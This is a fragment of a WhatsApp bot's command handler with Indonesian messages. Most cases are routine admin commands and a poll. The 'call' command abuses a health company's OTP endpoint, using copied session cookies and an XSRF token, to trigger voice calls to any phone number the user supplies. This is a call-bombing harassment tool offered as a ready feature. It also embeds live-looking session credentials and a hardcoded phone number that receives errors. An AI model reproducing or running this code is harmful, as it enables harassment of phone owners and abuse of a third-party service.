case 'shutdown':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis × mr_dark
case 'call':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

//©from: dennis
case 'public':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break

//©from: dennis
case 'private': case 'self':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break

//©from: dennis
case 'vote':
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {
"name": "@dcodedenpa",
"options": [{
"optionName": "option 1"
},{
"optionName": "option 2"
},{
"optionName": "option 3"
}],
"selectableOptionsCount": 3}}), { userJid: from })
semar.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
break
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}